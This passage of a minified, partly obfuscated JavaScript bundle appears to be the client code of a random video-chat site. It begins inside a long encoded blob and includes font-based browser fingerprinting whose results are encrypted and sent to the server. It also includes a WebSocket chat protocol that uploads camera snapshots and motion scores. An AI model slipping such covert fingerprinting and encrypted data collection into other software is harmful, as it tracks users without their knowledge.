iVow4rDl17CuMOPKBHDhRLDqw5iwojClzjCoVnCgcOYYcOEwpd2J3dbwrzDnBUFwpnCl8OowrTDrcKeGsOKw5XDriHCtUvCg8KLCC/Cv8O5w5LDhcOHNcK3OkZ+wp7CpAzDpS3CiDs8w4nCh8ONOsKRUcOSwp95wp3Cj8Kyw65Vw4/DgcKxw6rCjcOsD8OJw7jDhnF4w6rCgsKeKsK/J8O7UHEeIBjChwXDq1rDhHTDq8KqMsO6wqdlwpHDkSwPLBdOVQfDhgtww6FAOT7Dj8KIw5g3wpsjw4zDhMOwS8OQwqbDpMOuVsO2CsKaw7wGw7kVIyN8CMOhw7QxwofDmcKDTxMDwodvJHTCtF7CoSslw5nDikrDllHDuEVhw6UgOsOQw6jDlnXCr1jDhBbDljgHYUhffltnwrPCgTLDpBpuV8KjWsKwwoPCnMOcJMOrZ8Kxw4kXw6DCuGDCkGfCmMKmwqbCtcO+ZcKvHRnDvsKWw41rHUrDosKIE3DCq8Oow5sIw7poT8Oqw65vw4BDwrjCtwjDgcKyS8KjAxVew7Eiw5cEanzDryXCskBVDMO1wrtNw7k0w5TDs0vCoS5fwosLS8KbacKZelFPwonDkcOXwolYwpzCjsKiXWjCpzvCkMOuwqvDmgjDhnHCncOjP0dpw7EIbgR6wpTDujRPw44EPcKHNsKJwpXDphbCrMOqwpwUwpdgCsO0Vy3ClcKvwoogXcKJw6lAP8ONaADCjHdNS8KkKFTCgsO2w7t1fUolFsOmwrIwYcOsw7lLwrHCicOPwprCo8OJIsO+wqrCtW9sCcOxDMOcRTrDt3M4wpQ0WRIaw7tDKydowozCnTnDqy7CvyFCwrEDWzbDjcKUEk53w6dNw6oEQXfCnMOEwpcgw4twRMOHw4HDh8KTE8OCw5oqwrzDoA4cQAszBMOZFiDCksK4HwfCvMKQUsK7wr9CEsOnX8Kvwp/DlMKmwrXCmhPDucOOOsKVwq0iw7RVw5zCkcO7woBewpYVXMKhwrzDhVIjwqnClsOvFj9Iw6bCiSghBnxrGsK/W8K+HsO5wqttSkpNTcOvHMOMS8OHw4FMLcO3ej3CoyXCqcOwFHc9MsKgeWVqw7gcCR3DtcOCNMKxwobDqBTCtR7DiMO6dcOBwrrCmsK3w4fDiMOlw7oXw7NYLALCjUMpw55EGxYhw5FHw6/Cu1nDsi1tdcOXwrTDoBEEw4kawqfCm8Kod8KjT8K5w7QlMlQkwpvDnEvCscOowrx6woJ5w73CjMO4CsOAaiw3ScKeS8OEFATCj8KNIsKEfMKzw4vClT4Vw6bDtsOaCVzDssK5CA3Dmgl3wpTDjXPDlMOzV8KrRGMpwrtEWsOYw7jCgiFxwpzDosKRWcOWw5UXRcOewoc0aSfCrMKJw6JNw7fCgcKtwqTDhcKQERnDosKrAzrDhcOOw7PDvcKzKMKiwp4PwrUKw4fDlMKGw4xbw6LCrMOGwqTCiQFcF8O/Z8OMw6XCtlnDhsKfwqXDqsOfwqvDqmVHw5DDjw/ClsOvaA1ufCzDrg7Cu2QVWsOcw5XDnsKoOCw7AFXDqsKOYcK7w5DChsKoHnnDqsO8J0/ChcKkSVRGwrDCrTFqwqrDo8KSw5zCtMKYw5Q1w6AKaMOlw5F1wqQUAXjCo33CnMOcJy9FCcOQS8OcwpBHehNHE8K+Q8OIbUscw6bDqMOrw5A1w4PDjMKiEcKGYMKLwo/DmDQ2acO6csO9YMOvwqUKOSXCl8OBIcOlw7DDhQLDp8ONesOzwqooQB7DrcO2wpQdwprChcOTwqwiw4PCkGPCv3FPaMOkMWPDhAfCljLChlYWwofDrgrCt8KEw4xuWMOGKlzDmDDCkSrDrWLDscOIA8Okw70rMn7DusK9EEHCosOvV8O2OztXFcKTw6UbeGZ+wowYw4bCuAIqShzDpcKowpLCnMO3w67Du2ISw54FWmlgw58GwqfCmMOZw43Dn8KHwohUwpZkw4ESw6nCugBqXl1iAHnCosOawq7Cln7Dt8KVwpB2AR9ICcK4woXCqcKTw4ZgX1gewoLCscOGCU5+f04Yw4nCqcKRHijCtyIyKmxywqBzw6bClcOIe23DrhhYwp7DmDPDl0wxWMOeWsOLQMKyPx4ow7zCp8KLXsKFUmM5PT94w5dpR8OBw73CuU7Dgy7CoMOjC3UPZjdjw5cCwrgIwrbCqxsOwo1Ow47ClsOJwoJ7wrTDr8Omw5LDlksfEmDDhWFFwqTChcOyw4fCsnPCiEs/wovDu8KTf8O8w57CpMO8w5IvwoZtHw3CmCzDgAUKwovCuMKvwqp3w7rCiUnCrsOvDcOLMhjDl8OKwrFLwopnw6DCrAPCk8OsIjvDusOAwqR4G8KPZ8Kbw5gYNMKQXsOtUHcuwr0QwpnClQpMH8KXE8OXfsK6wq3CpT4GwoNfw4vDlcKKwpxiwqDCrcOuw4nDocK4w5XCgcKnI8KGeBYdwqTDjhQZZFvCk1LDkVPCqcO8XsK0PsONGiZ/BMKrZMOwYR8AKzDDmjRqw5VgwoDCqH9jwrfClsK0d2URwp/DusKdw67DsMKkwp0MFMOiw7fCrzPDu8Kcw75TBMOrw6I2UCI7w57DicKoHsK0Dg/CosOjw7MtwpFYWsOiesObw5HDkk4KG8ONS8K1wpjDmDbCnsOxwrLDiQU2wpHCt2/DmWDDrH9ZNcO+Vl/DtMK3GCzDvRjCtcOtJ8K1wpcawoMgf3jDjS/DijhVwpRSd8Ovw61SwoJnwrFfQsOMYcOHwoYRbTsyNcKqw79ffsKmam95wq9Iw7lHw4gewo7CpMKmEMOnwrvCimDDn8OybcO1SzHCscO8w6TCgcOCB8KNU8Oww5VoFzfDtsKlaVPDqmjCncOdNFVVwp9YwpNxHR3DicKhw7rCjwfDqcO9w4xOwqTDmlXCvcKJwptVI3fCqsKKIcOywo4xIsOnLMK3AUBaJlBkw5DDqsODez3CimfDlxs3SMKcE8KTWUIBworCm8KDdMOtLsKtwpbDtcKSTsKdw6VAEsKBQMOTDloUw5Isw4/CtcOwdcK3w7sKw6VIwpFhwoPCjsOCdFcEwrfCuw7Dq2ddwoNeZcKmwqXDjsOsdsKCZMO9woMnazjCgkXDg8KWbg8KA8O5w59zdQnDkGzDkRRpEMOKO8OmwpvCkzzDmFDCgcOIwooEw7XCgA1Rwq4EHsKAP8OAblbCisOUw4c6N8KQw5bDjQ3CrMOdwqfChcKVBcKPPHwZw6YHw6sLw5N7wrvDvcORfxzDtMOrw6/CsizDk3DCn8K8wqnCizxXw63Dp8OAw6/Djykqw5BmfMOGKcONA8O6SDxEwrIFwp8Bw7LDvSjDg2zDnyjDhEbDjMO1wpBmCE/DjcOtW8KIwqjCj8O2w4vDocK5VV7DncO7b3jCpmrDm8OjQ1kxw5XDjGrCjR4Aw6zCkjnDlTfDl3XDjizDpsKBwrTCjsOkXRfDn8KoCsObwrzDtAzDksKVw7FzPUdewo8Qw7rCksO5EDQrwoVcZl7DihQbWULDrXbCriAywrchHXDDlH7Cnn7DvsO0wq3DthgoRRJ6w6FXTHrCn8KWGndxworChcKOTsKlScOVw5Q6V8ORIE8owqHCl3rDtlTCkSsow5nDhsKnwqZaw7wOAsKHZ8OgSMKEw7bDrHQ8w4LCuWsIw5tQBWDCr8Kmw5Vnw5VZw487w6/CoMOXwqIzwpBnwpnDqVbDtsKpwrhQw7U/XcOOXhfDmRvCr1fCqcK1HcOjwoPCgMK0w6PDtMOhYMK4w5QyQVFxw6LChw9TCBoeADzDplHDjsKbw7cbwqzDucK0dirCgsOLwpzDnXjCqMOcw7hxPmpww4LCjMKvESzDhxLDgRJqNcOZw73Cr1jCiH0HVD7DocKuCBPDgMK0wpdcP8OVwpRfTMKVwoIJw6LDvRHCscOdw4bCvcOXw5/ChB7DhkARwq/DpsOww7zCoURHeErCh8OrwoDCgChyw6/CqhLCuMOYw7TDqgvCv1QSwp8twrzDp8OpwqnCu2jDr8Oiw5LCvHjDpsKMw5cWI8OVSncGTVllwp9rw5nDpjPDtElTw4xbCmjCoDdAWMO8woh1IhHDpsO6ZELCosOLZsKOYWbDgSDDtwPCv8KWdsKHwqtLdjJVd8KCHMKdR8KLJMKvV8OePELDjjpwdWdZw4RnNF/ChAlswr12w7cqPkhow7bDhFxKwppfwpjCvzpKw4NSw4gJWBoFUQ7CuAcZMsKvAcOZVCotJ8KYw6jDkcKtwpDCkcK8A1Y7JcOzw6bDl3sRWUHDtHzDmMOAw4kXGMOvw7Ubw4TDsXrDp8OIX2LCmsKyMsO4w60Bw7lVw4ZIRG0SwrfCtR8jwobClkt9HxLCiVReWynDplfCv8ONBjZzwpzDh8KTw7zDlCDCr8KORDYpEcOZwo3CsGIswoEjfRLCqcKMMsKswrPCrlzCkcO+w6zCgEXCoT/CtcKkwqwYwrsMwr7DhVfDhcKVwpY/CDJaD8KedMO/wphNwp58wo8oQhnCsyTDtsOvwqzCg8KqwoEFMgDDp8K0wpvDicO3FMOaZcOcw73DkcKNwrnChsK4w48ODcKqwoxJw5HDuyR2UcONZUYtD8ONXWPDtsK4wrfDlyXDtsKRVnnDigxja8KHwokXwrQve8KXYcOccWLDjMOBZMOjw50AGyRewoFfwptCJMOYSsOaF8OxGMOoUsO2w74Iw6DDusOZGMKIJVbCowcGJMKpw4XCiHDCtGgPw4VmHjLCtAs8aMKJwrPDhTRrLcK1wpjDhC3DnMO6VilwBcObw7/CgsKRwoLCpR5nLFcMZGDDjcK3VRjDmhbDqEXCkRzDnMKWN3pYwqLCiQVjTy1rcsOwA8OiUcKJwpYkE8Kyw4w5S8KiO28PMAR8S8K6ZEkKwqphwpvCs8KTA1EidMK0CcOmw6/CiQ4Rwodcw4vDucOkT8Kyw7TCu8Oew6J0B8OwF8K9w7QCZ8OHFxN3wqrCicOvw6swwqbCh8Knw7PDp2YYwqFlBVrDjsOPw7w8KglEeQhiwoHCv0bDgcOaw44XwpDClikRb8OuFcKIRsONGTfDsgwEwrRFLH7CmFJjwqIvw7nCnxzDsHh8w7BDPcObd8Kga8KGwqU6w53Dl8KCHCLDiMKxFCsWwr0Ow5xEwrLDsgfDoHgow7TCscOxwpUIdsOUwqXDusKcQ8OBw78kwoDDp2bCpEMvBGVHwp3CmMKoTUHCucOcQihGw53DkGbCjcKAcMOvOMKYwq7Cv0TDmVxew5Q2GVfCrx3CgMOXwrTDu8KyNkzDucK2wqUkw7gBIVvDtF9kw6JnFsOBZRVmwobDlcOSw7bCj3orOUZfw7TDkinDuFkiw7VEwo1fFsOIK8KscSd8fQTCpMKRw7gufkjDtxDCoMKbJcK9JsKXw5bDs8Odw6UDw5LCpTfCrcO6wogewr7Dp8KEw4PDncKsWH/DjCbCoE3DlGjCv2bDiXxrK8KcOcOaw5DDojMUbnBTw5hLw4jCv8OjJFbDkEXDmg5jw7TDgHHCqcOoCwQlw5rCl2LDlcKZw53Dgm/CpsOGKcOoXDLDkMOwwpbDvhxqLx7CrU7DssO2VifCjhgtKkFcb8Kpw4jDjsKqwonDjMOLEsOrwo3DvlbCo8ODwrF9woEawrUSHMOoFEvDm8OtwokMd8KEwrHClcKGwpcRwoQ8KMKMLXU6TRbCnQfCiWXDk8OtOsKlJwl1w6DDgDzDnMK1OF1Twr3CucKIKBJdwrvCoVPCmsKZw53Cj8OoIXMJwrTCgsK8wpkQb8KxMjjDoMKgw5I9YcO+PcKhHsK1fEoucX1eEMK1w6jCq11Cw4RvFcOlw6vDkGnCvsO+FisibMKWScOvGsO0w6t/woPDrsKHCcOxQSZaecKbw5vClhQEw59+LD3DlcK1fh1lwpfCpsOFwp7CvkA9w5ZcR8KFHiJ0wopCUVZZV8OXbcOhwq3Clk4Jw7fCqcKFRMKX")).split(";"), f = document.getElementsByTagName("body")[0], i = document.createElement("div"), u = document.createElement("div"), r = {}, o = {}, c = function () {
                var n = e, a = document.createElement("span");
                return a.style.position = "absolute", a.style.left = "-9999px", a.style.fontSize = "72px", a.style.lineHeight = "normal", a.innerHTML = "mmmmmmmmmmlli", a;
              }, t = function (a) {
                for (var f = e, i = false, u = 0; u < n.length; u++) if (i = a[u].offsetWidth !== r[n[u]] || a[u].offsetHeight !== o[n[u]]) return i;
                return i;
              }, x = function () {
                for (var a = e, f = [], u = 0, r = n.length; u < r; u++) {
                  var o = c();
                  o.style.fontFamily = n[u], i.appendChild(o), f.push(o);
                }
                return f;
              }();
              f.appendChild(i);
              for (var s = 0, l = n.length; s < l; s++) r[n[s]] = x[s].offsetWidth, o[n[s]] = x[s].offsetHeight;
              var d = function () {
                for (var f, i, r, o, t = e, x = {}, s = 0, l = a.length; s < l; s++) {
                  for (var d = [], D = 0, b = n.length; D < b; D++) {
                    var C = (f = a[s], i = n[D], r = void 0, o = void 0, r = e, (o = c()).style.fontFamily = "'" + f + "'," + i, o);
                    u.appendChild(C), d.push(C);
                  }
                  x[a[s]] = d;
                }
                return x;
              }();
              f.appendChild(u);
              for (var D = [], b = 0, C = a.length; b < C; b++) t(d[a[b]]) && D.push(a[b]);
              return f.removeChild(u), f.removeChild(i), D;
            }());
            var S = E.slice(1, -1);
            S.splice(10, 1);
            var T = function (e) {
              var n = [];
              return g(e, function (e) {
                var a = _0x28ad;
                n.push(void 0 !== e.join ? e.join(";") : e);
              }), n;
            }, P = function (e, f) {
              var o = k;
              return "0" + f + Da(e.join("~~~")) + +n + +a + +u + +r + +i;
            }, H = T(E), N = T(S), q = P(H, 1), K = P(N, 2), U = Crypter.encrypt(H.join("~~~")), Z = {};
            Z.data = U, Z.cSup = n, Z.wSup = a, Z.mod = i, Z.tduOvr = u, Z.wTduBrk = r, o = Z, f && console.log(o), c([q, K]);
          } catch (e) {
            t(e);
          }
        }, 1);
      });
    }, z.debugData = function () {
      return o;
    }, z;
  }();
  function ma(e, n, a) {
    var i = f, u = {};
    return u.value = a, u.enumerable = true, u.configurable = true, u.writable = true, n in e ? Object.defineProperty(e, n, u) : e[n] = a, e;
  }
  function va(e, n, a) {
    var i = f;
    if (!n.has(e)) throw new TypeError("attempted to " + a + " private field on non-instance");
    return n.get(e);
  }
  var ga = new WeakMap;
  function _a(e, n, a) {
    var i = f, u = {};
    return u.value = a, u.enumerable = true, u.configurable = true, u.writable = true, n in e ? Object.defineProperty(e, n, u) : e[n] = a, e;
  }
  var ha = class {
    get ["timeout"]() {
      var e = f;
      const {showWithForceTimeout: n, forceTimeout: a, timeout: i} = this.settings;
      return n ? a : i;
    }
    get ["checkAgainEnabled"]() {
      var e = f;
      return this.checkMotionEnabled && !this.settings.showWithForceTimeout;
    }
    constructor(e) {
      var n = f;
      _a(this, "increaseTimeout", () => {
        var e = n;
        this.settings.timeout += this.timeoutIncrement, this.settings.timeout = Math.min(this.settings.timeout, this.maxTimeout), this.save();
      }), _a(this, "save", () => {
        var e = n;
        localStorage.setItem("syfp", btoa(JSON.stringify(this.settings)));
      }), _a(this, "showNow", () => {
        var e = n;
        this.settings.showNow = true, this.save();
      }), _a(this, "reset", () => {
        var e = n;
        this.settings.showNow = false, this.settings.showWithForceTimeout = false, this.save();
      }), this.showAfterConnectionsNum = e[0] || 10, this.initialTimeout = e[1] || 5, this.timeoutIncrement = e[2] || 5, this.maxTimeout = e[3] || 30, this.forceTimeout = e[4] || 30, this.checkMotionEnabled = e[5] || 0, this.forceTimeoutIncrement = e[6] || 30, this.maxForceTimeoutIncrementNum = e[7] || 10, this.resetForceTimeoutAfter = 1e3 * (e[8] || 21600);
      var a = {};
      a.timeout = this.initialTimeout, a.forceTimeout = this.forceTimeout, a.showNow = false, a.showWithForceTimeout = false, a.forceTimeoutIncrementNum = -1, a.forceTimeoutIncrementUpdatedAt = 0;
      const i = a;
      try {
        this.settings = JSON.parse(atob(localStorage.getItem("syfp"))) || i;
      } catch (e) {
        this.settings = i;
      }
      const u = new Date(this.settings.forceTimeoutIncrementUpdatedAt);
      new Date - u > this.resetForceTimeoutAfter && (this.settings.forceTimeoutIncrementNum = -1), $(window).on("socket:notification", (e, a) => {
        var f = n;
        a.Data.no_face && !this.settings.showNow && (this.settings.showNow = true, this.settings.showWithForceTimeout = true, this.settings.forceTimeoutIncrementNum += 1, this.settings.forceTimeoutIncrementNum = Math.min(this.settings.forceTimeoutIncrementNum, this.maxForceTimeoutIncrementNum), this.settings.forceTimeout = this.forceTimeout + this.settings.forceTimeoutIncrementNum * this.forceTimeoutIncrement, this.settings.forceTimeoutIncrementUpdatedAt = (new Date).getTime(), this.save());
      });
    }
  };
  function wa(e, n, a) {
    var i = f, u = {};
    return u.value = a, u.enumerable = true, u.configurable = true, u.writable = true, n in e ? Object.defineProperty(e, n, u) : e[n] = a, e;
  }
  function pa(e, n, a) {
    var i = f, u = {};
    return u.value = a, u.enumerable = true, u.configurable = true, u.writable = true, n in e ? Object.defineProperty(e, n, u) : e[n] = a, e;
  }
  var ya = class {
    constructor(e) {
      var n = f;
      pa(this, "data", []), pa(this, "add", e => {
        var a = n;
        this.data.push(e), this.data.length > this.length && this.data.shift();
      }), pa(this, "clear", () => {
        this.data = [];
      }), this.length = e;
    }
  };
  function za(e, n, a) {
    var i = f, u = {};
    return u.value = a, u.enumerable = true, u.configurable = true, u.writable = true, n in e ? Object.defineProperty(e, n, u) : e[n] = a, e;
  }
  const Ba = "ome.tv" === location.host ? "https://cdn.ome.tv" : "https://roulette.apps-host.com";
  var La = class {
    static ["check"]() {
      return new Promise((e, n) => {
        var a = _0x28ad;
        const f = new Image;
        f.src = Ba + "/images/background.png?t=" + (new Date).getTime(), f.crossOrigin = "anonymous", f.onload = () => {
          var n = a;
          const i = document.createElement("canvas");
          i.width = 1, i.height = 1;
          const u = i.getContext("2d");
          u.drawImage(f, 0, 0, 1, 1);
          const r = u.getImageData(0, 0, 1, 1);
          e(r.data[3] < 38.25);
        };
      });
    }
  }, Ma = {};
  Ma.online = 0;
  const Fa = "online_counter/update", Aa = Ma;
  var ka = {};
  ka.authorized = false;
  const Ea = ka, ja = {};
  function Sa(e) {
    var n = f, a = {};
    return a.type = "ban/show", a.payload = e, a;
  }
  var Ta = {};
  Ta.pos = null;
  const Pa = "camera_access_hint/hide", Ha = "camera_access_hint/pos_left", Na = "camera_access_hint/pos_right", qa = Ta;
  var Ka = function e(n, a, i) {
    var u, r = f;
    if ("function" == typeof a && "function" == typeof i || "function" == typeof i && "function" == typeof arguments[3]) throw new Error("It looks like you are passing several store enhancers to createStore(). This is not supported. Instead, compose them together to a single function.");
    if ("function" == typeof a && void 0 === i && (i = a, a = void 0), void 0 !== i) {
      if ("function" != typeof i) throw new Error("Expected the enhancer to be a function.");
      return i(e)(n, a);
    }
    if ("function" != typeof n) throw new Error("Expected the reducer to be a function.");
    var o = n, c = a, t = [], x = t, s = false;
    function l() {
      x === t && (x = t.slice());
    }
    function d() {
      if (s) throw new Error("You may not call store.getState() while the reducer is executing. The reducer has already received the state as an argument. Pass it down from the top reducer instead of reading it from the store.");
      return c;
    }
    function D(e) {
      var n = r;
      if ("function" != typeof e) throw new Error("Expected the listener to be a function.");
      if (s) throw new Error("You may not call store.subscribe() while the reducer is executing. If you would like to be notified after the store has been updated, subscribe from a component and invoke store.getState() in the callback to access the latest state. See https://redux.js.org/api-reference/store#subscribelistener for more details.");
      var a = true;
      return l(), x.push(e), function () {
        var f = n;
        if (a) {
          if (s) throw new Error("You may not unsubscribe from a store listener while the reducer is executing. See https://redux.js.org/api-reference/store#subscribelistener for more details.");
          a = false, l();
          var i = x.indexOf(e);
          x.splice(i, 1), t = null;
        }
      };
    }
    function b(e) {
      var n = r;
      if (!S(e)) throw new Error("Actions must be plain objects. Use custom middleware for async actions.");
      if (void 0 === e.type) throw new Error('Actions may not have an undefined "type" property. Have you misspelled a constant?');
      if (s) throw new Error("Reducers may not dispatch actions.");
      try {
        s = true, c = o(c, e);
      } finally {
        s = false;
      }
      for (var a = t = x, f = 0; f < a.length; f++) (0, a[f])();
      return e;
    }
    function C(e) {
      var n = r;
      if ("function" != typeof e) throw new Error("Expected the nextReducer to be a function.");
      var a = {};
      a.type = j.REPLACE, o = e, b(a);
    }
    function m() {
      var e, n = D;
      return (e = {subscribe: function (e) {
        var a = _0x28ad;
        if ("object" != typeof e || null === e) throw new TypeError("Expected the observer to be an object.");
        function f() {
          var n = a;
          e.next && e.next(d());
        }
        return f(), {unsubscribe: n(f)};
      }})[k.a] = function () {
        return this;
      }, e;
    }
    var v = {};
    return v.type = j.INIT, b(v), (u = {dispatch: b, subscribe: D, getState: d, replaceReducer: C})[k.a] = m, u;
  }(function (e) {
    for (var n = f, a = Object.keys(e), i = {}, u = 0; u < a.length; u++) {
      var r = a[u];
      "function" == typeof e[r] && (i[r] = e[r]);
    }
    var o, c, t, x = Object.keys(i);
    try {
      c = i, t = n, Object.keys(c).forEach(function (e) {
        var n = t, a = c[e], f = {};
        if (f.type = j.INIT, void 0 === a(void 0, f)) throw new Error('Reducer "' + e + "\" returned undefined during initialization. If the state passed to the reducer is undefined, you must explicitly return the initial state. The initial state may not be undefined. If you don't want to set a value for this reducer, you can use null instead of undefined.");
        var i = {};
        if (i.type = j.PROBE_UNKNOWN_ACTION(), void 0 === a(void 0, i)) throw new Error('Reducer "' + e + "\" returned undefined when probed with a random type. Don't try to handle " + j.INIT + ' or other actions in "redux/*" namespace. They are considered private. Instead, you must return the current state for any unknown actions, unless it is undefined, in which case you must return the initial state, regardless of the action type. The initial state may not be undefined, but can be null.');
      });
    } catch (e) {
      o = e;
    }
    return function (e, a) {
      var u, r, c, t, s = n;
      if (void 0 === e && (e = {}), o) throw o;
      for (var l = false, d = {}, D = 0; D < x.length; D++) {
        var b = x[D], C = i[b], m = e[b], v = C(m, a);
        if (void 0 === v) {
          var g = (u = b, c = void 0, t = void 0, c = f, t = (r = a) && r.type, "Given " + (t && 'action "' + String(t) + '"' || "an action") + ', reducer "' + u + '" returned undefined. To ignore an action, you must explicitly return the previous state. If you want this reducer to hold no value, you can return null instead of undefined.');
          throw new Error(g);
        }
        d[b] = v, l = l || v !== m;
      }
      return (l = l || x.length !== Object.keys(e).length) ? d : e;
    };
  }({onlineCounter: function (e = Aa, n) {
    var a = f;
    switch (n.type) {
      case Fa:
        return Object.assign({}, e, n.payload);
      default:
        return e;
    }
  }, snAuth: function (e = Ea, n) {
    var a = f;
    switch (n.type) {
      case "sn_auth/sign_in":
        var i = {};
        return i.authorized = true, i;
      case "sn_auth/sign_out":
        var u = {};
        return u.authorized = false, u;
      default:
        return e;
    }
  }, ban: function (e = ja, n) {
    var a = f;
    switch (n.type) {
      case "ban/show":
        return Object.assign({}, e, n.payload);
      default:
        return e;
    }
  }, cameraAccessHint: function (e = qa, n) {
    var a = f;
    switch (n.type) {
      case "camera_access_hint/show":
      case Pa:
        return Object.assign({}, e, n.payload);
      default:
        return e;
    }
  }}));
  let Ua, Za, Ga, Ya;
  const Va = () => {
    var e = f;
    window.rComponents.loginPopup.show(true);
  };
  class Ia {}
  var Wa, Ja, Ra;
  Ra = (e = false) => {
    var n = f;
    window.blogger = new Blogger, window.myIP = new MyIP;
    const a = myIP.detect(), i = new class {
      constructor() {
        var e = f;
        Jn(this, "connect", () => new Promise((n, a) => {
          var f = e;
          this.socket = new WebSocket(config.lobby_url), this.socket.onopen = () => {
            var e = f;
            this.sendHandshake(), this.receiveMessage().then($n).then(n);
          };
        })), Jn(this, "sendHandshake", () => {
          var n = e;
          this.socket.send("E");
        }), Jn(this, "receiveMessage", () => new Promise((n, a) => {
          var f = e;
          this.socket.onclose = e => n({}), this.socket.onmessage = e => n(e.data);
        })), Jn(this, "register", () => this.lobbyData.get().catch(n => (this.send("R"), this.getMessage().then(this.lobbyData.set)))), Jn(this, "login", async n => {
          var a = e;
          this.send("L", n);
          const f = await this.getMessage();
          return this.socket.close(), new Gn($.extend({}, n, f));
        }), Jn(this, "send", async (n, a) => {
          var f = e;
          const i = a ? JSON.stringify(a) : "", u = Rn.encode(n + i);
          this.socket.send(u);
        }), Jn(this, "getMessage", async () => {
          var n = e;
          const a = await this.receiveMessage(), f = await On.decode(a);
          return JSON.parse(f);
        }), this.lobbyData = new Un;
      }
    };
    e && (Ua = new class {
      constructor(e) {
        var n = f, a = {};
        a.writable = true, a.value = false, oa.set(this, a), ea(this, "connect", async e => {
          var a = n;
          window.bl || (this.ticket = e, this.connection = new WebSocket(config.roulette_url || e.ChatAddr), this.connection.onclose = this.onClose.bind(this), this.connection.onerror = console.log, await this.handshake(), await this.login());
        }), ea(this, "handshake", async () => new Promise((e, a) => {
          var f = n;
          this.connection.onmessage = n => {
            var a = f;
            (async function (e) {
              var n = _0x28ad;
              fa = await Wn.build(ra, e, 4, 18, 0, 16), ia = await Wn.build(ra, e, 24, 38, 16, 32);
            }(n.data).then(e));
          }, this.connection.onopen = () => {
            var e = f;
            this.send("NCR", {}, false, false);
          };
        })), ea(this, "login", async () => new Promise((e, a) => {
          var f = n;
          this.connection.onmessage = n => {
            var i = f;
            this.connection.onmessage = this.onMessage.bind(this), this.parseMessage(n.data).then(([n, f]) => {
              var u = i;
              if ("LGR" === n && 0 === f.Result) na(this, oa, true), e(); else {
                let e;
                4 === f.Result ? (e = "id_clash_message", this.reconnect = false) : e = "connection_closed", new Locker(_.translate(e)), a();
              }
            });
          }, this.send("LOG", this.ticket, true, false);
        })), ea(this, "send", (e, n = {}, a = true, f = true) => {
          const i = () => {
            var f = _0x28ad;
            let i = e + JSON.stringify(n);
            a && (i = fa.encode(i)), this.connection.send(i);
          }, u = () => {
            var e, n, a, i = _0x28ad;
            return f ? (e = this, (n = aa(this, oa, "get"))[(a = _0x28ad)("0x607")] ? n.get.call(e) : n.value) : 1 === this.connection.readyState;
          };
          if (u()) return i();
          let r = setInterval(() => {
            if (this.destroyed && clearInterval(r), u()) return clearInterval(r), i();
          }, 200);
        }), ea(this, "onMessage", async e => {
          var a = n;
          let f, [i, u] = await this.parseMessage(e.data);
          switch (u.PairId && (this.pairId = u.PairId), i) {
            case "PUS":
              window.ductTape.updateOnlineCounter(u.Online);
              break;
            case "BGD":
              ua.onBeginDialog.call(ua, u), motionDetector.capture();
              break;
            case "WRD":
              ua.onRemoteDescription.call(ua, u);
              break;
            case "ICE":
              ua.onRemoteIceCandidate.call(ua, u);
              break;
            case "END":
              ua.onEndDialog.call(ua, u);
              break;
            case "TUC":
              f = "turn_credentials";
              break;
            case "CHT":
              chat.appendIncomeMessage.call(chat, u.Text);
              break;
            case "GEP":
              this.sendPIC(u.GetQuotes, u.GetReportPics);
              break;
            case "REN":
              f = "ren";
              break;
            case "STT":
              f = "translation_token";
              break;
            case "UDD":
              f = "dialog_data";
              break;
            case "OBS":
              ua.obs.call(ua, u);
              break;
            case "OWD":
              ua.owd.call(ua, u);
              break;
            case "OIC":
              ua.oic.call(ua, u);
              break;
            case "NTF":
              f = "notification";
              break;
            case "ODD":
              new Qn.a(u).exec(this);
              break;
            case "KCK":
              this.reconnect = false, 0 === u.Reason ? new Locker(_.translate("id_clash_message")) : 1 === u.Reason && window.rComponents.loginPopup.show(true);
              break;
            case "ICL":
              this.reconnect = false, new Locker(_.translate("id_clash_message"));
          }
          if (null != f) return $(document).trigger("socket:" + f, u);
        }), ea(this, "parseMessage", async e => {
          var a = n;
          const f = await ia.decode(e);
          return [f.substr(0, 3), JSON.parse(f.substr(3) || "{}")];
        }), ea(this, "onClose", e => {
          var a = n;
          na(this, oa, false), this.reconnect && (setTimeout(this.onSocketClose, this.timeout || 1e3), this.timeout = null);
        }), ea(this, "sendNXT", () => {
          var e = n;
          this.send("NXT");
        }), ea(this, "sendCHT", e => {
          var a = n, f = {};
          f.PairId = this.pairId, f.Text = e, this.send("CHT", f);
        }), ea(this, "sendWRD", e => {
          var a = n, f = {};
          f.PairId = this.pairId, f.Data = e, this.send("WRD", f);
        }), ea(this, "sendICE", e => {
          var a = n, f = {};
          f.PairId = this.pairId, f.Data = e, this.send("ICE", f);
        }), ea(this, "sendDEA", () => {
          var e = n;
          this.send("DEA");
        }), ea(this, "sendPIC", (e, a) => {
          var f = n;
          let i, u;
          var r = {};
          r.Pic = ua.getLocalScreen(!e), i = r, e && (i.Quotes = quotes.quotes()), u = a ? ReportedPictures.get() : [], i.ReportPics = JSON.stringify(u), i.MotionScore = motionDetector.serialize(), this.send("PIC", i);
        }), ea(this, "sendFIL", e => {
          var a = n, f = {};
          f.Country = e, this.send("FIL", f);
        }), ea(this, "sendSUT", () => {
          var e = n;
          this.send("SUT");
        }), ea(this, "sendREU", () => {
          var e = n, a = {};
          a.PairId = this.pairId, this.send("REU", a);
        }), ea(this, "close", () => {
          var e = n;
          this.timeout = 1, na(this, oa, false), this.connection && this.connection.close();
        }), ea(this, "sendGTC", () => {
          var e = n;
          this.send("GTC");
        }), ea(this, "sendUED", e => {
          var a = n, f = {};
          f.ExtraUserData = e, this.send("UED", f);
        }), ea(this, "sendUDD", e => {
          var a = n, f = {};
          f.Data = e, this.send("UDD", f);
        }), ea(this, "destroy", () => {
          var e = n;
          this.reconnect = false, this.destroyed = true, this.close();
        }), ea(this, "sendToObserver", (e, a, f) => {
          var i = n, u = {};
          u.Id = a, u.Data = f, this.send(e, u);
        }), ea(this, "sendOWD", (e, a) => this.sendToObserver("OWD", e, a)), ea(this, "sendOIC", (e, a) => this.sendToObserver("OIC", e, a)), ea(this, "sendODD", (e, a) => this.sendToObserver("ODD", e, a)), ea(this, "setRoulette", e => {
          ua = e;
        }), this.pairId = null, this.timeout = 1e3, this.destroyed = false, this.reconnect = true, this.onSocketClose = e, $(window).on("roulette:destroy", this.destroy);
      }
    }(Ia.init.bind(Ia)));
    const u = new wn(Ua);
    u.init();
    const r = new class {
      constructor(e) {
        var n, a, i = f, u = {};
        u.writable = true, u.value = void 0, ga.set(this, u), ma(this, "data", () => {
          var e = i, n = {};
